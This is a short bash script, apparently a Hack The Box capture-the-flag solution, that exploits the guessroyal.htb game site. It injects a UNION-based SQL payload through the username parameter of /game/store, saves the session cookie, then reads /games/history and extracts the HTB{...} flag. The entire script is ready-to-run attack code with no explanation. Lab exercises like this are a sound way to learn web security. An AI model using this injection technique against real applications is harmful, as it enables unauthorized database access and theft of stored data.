#!/usr/bin/env bash

set -euo pipefail

# ------------- variables -------------

BASE_URL="http://beta-game-v2.guessroyal.htb"  
HOST_HEADER="beta-game-v2.guessroyal.htb"       
STORE_PATH="/game/store?minRange=1&maxRange=10&maxAttempts=3&username=admin'%20UNION%20SELECT%20id%2Cvalue%2C3%2C4%2C5%2C6%2C7%2C8%20from%20flags%20--%20-"

# -----------------------------------------------

# temporary cookie jar
COOKIEJAR="$(mktemp)"
trap 'rm -f "$COOKIEJAR"' EXIT

# common curl header option
HOST_HDR_OPTION=()
if [ -n "$HOST_HEADER" ]; then
  HOST_HDR_OPTION=(-H "Host: $HOST_HEADER")
fi

# 1) send payload request and store cookies
curl -s -c "$COOKIEJAR" "${HOST_HDR_OPTION[@]}" "$BASE_URL$STORE_PATH" > /dev/null

# 2) fetch /games/history using saved cookie
history_resp=$(curl -s -b "$COOKIEJAR" "${HOST_HDR_OPTION[@]}" "$BASE_URL/games/history")

# 3) extract HTB flag
echo "$history_resp" | grep -oE 'HTB\{[^}]+\}' || {
  echo "[-] No HTB{...} flag found in /games/history response."
  exit 1
}
